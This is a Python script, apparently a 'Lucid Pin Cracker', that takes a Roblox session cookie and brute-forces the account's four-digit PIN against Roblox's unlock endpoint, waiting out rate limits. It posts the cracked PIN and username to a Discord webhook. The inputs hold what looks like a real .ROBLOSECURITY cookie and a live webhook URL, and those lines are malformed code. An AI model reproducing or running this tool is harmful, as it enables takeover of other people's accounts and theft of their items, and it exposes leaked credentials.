import requests
import re
import string
import time
import os

pingEveryone = True
print('')
print('Enter your cookie below:')
cookie = input(_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_73671F9AECF04067CF7E7742652E9349E96375B0B404FE5E190DCFD03E8F0EF116A99D4E19A4A4622632AAAE3A5E26B81FFC990CB198AB3C2AE9C16CFADC1709AF89C16F543BCFFA2D1FAEF4AA1A6C1EC5E368AA01458E6BD0F8F8EFB8E5E015B383BFF145C56D8835D36EA403CBE8BDCF4258C4B5C831D009E235C95F10AAB5F64AFAC9237363214692CA5F1A5EA5409361B42355367C37A7EEC6F703F85BE32A8DE26A085C87D153CBA2163659E07C1BAF3B339CB44837AF6F181429ECE5486A998B41DEF7B64ECB3C2BFC48DE1D1D12AA47228DEF015CE17CCB77777360B0A9DA300242474003F132E6B46BD113283F6F55504033E13E0CC30D501D93C448B8CBF45F7555584B093EA56C5CF54DC0FD2C8E09CDCD91112DA4E648B62BC0BA6EA141A0F92156F066D00C0902A66ACB6CE8F7B6C89EDA9A240E74AD77DBFA7044866D80AB2C4FAC8E60959F038364C03CB6BDF98B3EE0D2D126F443D83D18F1E8B5F6C8)
os.system("cls")
print('')
print('Enter your webhook below:')
webhook = input(https://discord.com/api/webhooks/987008409742245919/aPzXzT_yH2b-sVduNTU76ktXo-iDmB6xoUsRacvbvFJw0ca65pYzwc44O4NEIhEze8TA)
os.system("cls")
print('')
print('Should we ping Everyone?: ( y / n )')
pingEveryone = input()
os.system("cls")
if pingEveryone.lower == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
else:
    ping = '***Pin Cracked!***'
os.system("cls")

print('''
  ██╗     ██╗   ██╗ █████╗ ██╗██████╗   ██████╗ ██╗███╗  ██╗
  ██║     ██║   ██║██╔══██╗██║██╔══██╗  ██╔══██╗██║████╗ ██║
  ██║     ██║   ██║██║  ╚═╝██║██║  ██║  ██████╔╝██║██╔██╗██║
  ██║     ██║   ██║██║  ██╗██║██║  ██║  ██╔═══╝ ██║██║╚████║
  ███████╗╚██████╔╝╚█████╔╝██║██████╔╝  ██║     ██║██║ ╚███║
  ╚══════╝ ╚═════╝  ╚════╝ ╚═╝╚═════╝   ╚═╝     ╚═╝╚═╝  ╚══╝

   █████╗ ██████╗  █████╗  █████╗ ██╗  ██╗███████╗██████╗ 
  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
  ██║  ╚═╝██████╔╝███████║██║  ╚═╝█████═╝ █████╗  ██████╔╝
  ██║  ██╗██╔══██╗██╔══██║██║  ██╗██╔═██╗ ██╔══╝  ██╔══██╗
  ╚█████╔╝██║  ██║██║  ██║╚█████╔╝██║ ╚██╗███████╗██║  ██║
   ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n\n''')

url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
xcrsf = (token.headers['x-csrf-token'])
header = {'X-CSRF-TOKEN': xcrsf}

i = 0

for i in range(9999):
    try:
        pin = str(i).zfill(4)
        payload = {'pin': pin}
        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
        if 'unlockedUntil' in r.text:
            print(f'Pin Cracked! Pin: {pin}')
            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
            data = {
                "content" : ping,
                "username" : "Lucid Pin Cracker",
                "avatar_url" : "https://cdn.discordapp.com/attachments/857646271433801748/861595357778804756/lucidicon.png"
            }
            data["embeds"] = [
                {
                    "description" : f"{username}\'s Pin:\n```{pin}```",
                    "title" : "Cracked Pin!",
                    "color" : 0x00ffff,
                }
            ]

            result = requests.post(webhook, json = data)
            input('Press any key to exit')
            break
            
        elif 'Too many requests made' in r.text:
                
            print('  Ratelimited, trying again in 60 seconds..')
            time.sleep(60)
                
        elif 'Authorization' in r.text:
                
            print('  Error! Is the cookie valid?')
            break
            
        elif 'Incorrect' in r.text:
            print(f"  Tried: {pin} , Incorrect!")
            time.sleep(10)  
    except:
        print('  Error!')
    
input('\n  Press any key to exit')
        


        



    
        
            
        



